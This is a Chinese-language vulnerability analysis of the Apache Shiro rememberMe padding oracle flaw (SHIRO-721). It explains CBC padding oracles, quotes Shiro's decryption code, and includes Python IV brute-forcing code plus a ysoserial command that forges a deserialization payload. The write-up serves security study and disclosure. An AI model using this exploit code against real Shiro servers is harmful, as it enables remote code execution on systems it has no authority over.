## **0x01 概述**

Shiro 使用 AES-128-CBC模式对cookie进行加密，受Padding Oracle Attack影响。

影响范围:

> 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1  
>

利用条件：

合法用户cookie中的rememberMe值。

## 0x02 漏洞分析

##  rememberMe 是CookieRememberMeManager
所使用的的值，是序列化字符串经对称密钥加密后的密文。在一些存在漏洞站点中，因为使用了某些默认的密钥，导致攻击者可以构造任意包含恶意序列化字符串的密文，进而利用反序列化操作执行任意命令。本漏洞中，攻击者不需要得知密钥，仅需要获取一个合法的rememberMe值即可通过Padding
Oracle Attack构造恶意密文，达成攻击。

**Padding Oracle Attack** 是针对使用特定填充协议的CBC Mode分组加密过程的攻击，在满足攻击条件的情况下，利用Padding
Oracle Attack可以在无需获取密钥的情况下，解密任意密文或构造任意明文的合法密文。  

CBC 工作模式流程如图所示：

![1280px-CBC_encryption.svg.png](https://image.3001.net/images/20191119/1574151416_5dd3a4f8215a7.png!small)  

![1280px-CBC_decryption.svg.png](https://image.3001.net/images/20191119/1574151377_5dd3a4d14b7be.png!small)  

对任意任一区块的操作为：

    
    
      加密： P ⊕ IV = IMV => C= E(IMV)
    
      解密： IMV = D(C) => P = IMV ⊕ IV
    
       P: PlainText
       C: CipherText
       IV: Initialization Vector
       IMV: Intermedia Value
       D(): Decrypto with key
       E(): Encrypto with key

各分组区块间相互作用，顺序链接。同时，由于分组加密需要各分组满足一定长度要求，不足的分组需要进行一定的填充，在PKCS#5
padding方案中，使用不足的长度值作为填充数值。解密操作得到的明文如果不满足padding方案，则判定密文非法。一般实现中，对此种情况会抛出异常。

在此情况下，对于给定的C，IMV是确定，IV可控，则P的合法性可借由Padding数值、长度以及报错信息得以谕示。通过操作IV，可以做到对IMV的猜解，进而获取明文。同样的，通过控制IV也可以使任意P满足P
⊕ IV = IMV，进而可获取任意明文的加密数据。即，Padding Oracle Attack。

可以总结，Padding Oracle Attack 的条件为：

1、密文及IV

2、谕示，即解密失败或成功的结果。

  

对于Shiro，其使用了如下实现：

    
    
        // core\src\main\java\org\apache\shiro\mgt\AbstractRememberMeManager.java
    
        protected byte[] decrypt(byte[] encrypted) {
                byte[] serialized = encrypted;
                CipherService cipherService = getCipherService();
                if (cipherService != null) {
                    ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());
                    serialized = byteSource.getBytes();
                }
                return serialized;
            }
    
        protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
            if (getCipherService() != null) {
                bytes = decrypt(bytes);  // decrypto
            }
            return deserialize(bytes);  // deserualize
        }
    
        public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
                PrincipalCollection principals = null;
                try {
                    byte[] bytes = getRememberedSerializedIdentity(subjectContext);
                    //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
                    if (bytes != null && bytes.length > 0) {
                        principals = convertBytesToPrincipals(bytes, subjectContext);
                    }
                } catch (RuntimeException re) {
                    principals = onRememberedPrincipalFailure(re, subjectContext); // set-cookie: Remember=delete
                }
    
                return principals;  
    

传入的remember数值生成过程为：

    
    
          Base64Encode(IV+AES-128-CBC.encrypto(Serialize(object))))

处理过程为：

    
    
          Deserialize(AES-128-CBC.decrypto(Base64Decode(Cookie)))

其中，对于正确和错误的密文，存在两种不同的反馈：

    
    
        无效rememberMe: 响应中存在 `Set-Cookie: rememberMe=deleteMe`
        有效rememberMe：响应中无 `Set-Cookie: rememberMe=deleteMe`

以上处理，正满足Padding Oracle Attack的利用条件。

## 0x03 复现

复现步骤：

    
    
            1. 从合法用户的cookie中获取RememberMe值。
    	2. 通过Padding Oracle Attack构造padload的密文
    	3. 将原RememberMe值与构造出的payload密文进行拼接，编码后作为新的RememberMe值发送，触发反序列化。

区块爆破代码：

    
    
    def generate_pre_ciphertext(plaintext, ciphertext):
        plaintext = list(plaintext)
        print(plaintext)
    
        iv = list("0" * block_length)
        iv = [int(item, 16) for item in iv]
    
        index = block_length - 1  # 最低起始位
        while index >= 0:
            while not send_and_check(iv, ciphertext):
                iv[index] += 1
    
            # 处理可能的连续 padding值,如 00000202，与00000201均合法
            # 触及填充位则报错，否则正常。
            if index == block_length - 1:
                for tmp_index in range(block_length - 1):
                    iv[tmp_index] += 1
                    if not send_and_check(iv, ciphertext):
                        index = tmp_index
                    iv[tmp_index] -= 1
    
            if index != 0:
                for tmp_index in range(index - block_length, 0):
                    current_padding = block_length - index
                    next_padding = block_length - index + 1
                    iv[tmp_index] = iv[tmp_index] ^ current_padding ^ next_padding
            index -= 1
        for i in range(block_length):
            if isinstance(plaintext[i], str):
                plaintext[i] = ord(plaintext[i])
            iv[i] = iv[i] ^ 0x10 ^ plaintext[i]
        return "".join(["{:02x}".format(i) for i in iv])

使用 ysoerial构造序列化payload

    
    
      java -jar ysoserial-master-SNAPSHOT.jar  CommonsBeanutils1 "touch /tmp/shiro"  
    

复现结果：

![real_前.png](https://image.3001.net/images/20191119/1574154988_5dd3b2ec190d8.png!small)  

![real_后.png](https://image.3001.net/images/20191119/1574154997_5dd3b2f5822a3.png!small)  

## 0x04 参考

1\. [Shiro-721](https://issues.apache.org/jira/browse/SHIRO-721)

2\. [Padding Oracle
Attack的一些细节与实现](https://www.cnblogs.com/zlhff/p/5519175.html)

3\. [Padding Oracle
Attack详解](https://wenku.baidu.com/view/6dd0cacdda38376baf1faeb4.html)

4\. [Automated Padding Oracle Attacks With
PadBuster](https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html)

5\. [Going the other way with padding oracles: Encrypting arbitrary
data!](https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data)

6\. [Shiro RCE again（Padding Oracle
Attack）](https://www.anquanke.com/post/id/192819?from=timeline&isappinstalled=0)

7\. [poracle](https://github.com/iagox86/poracle)

  

  

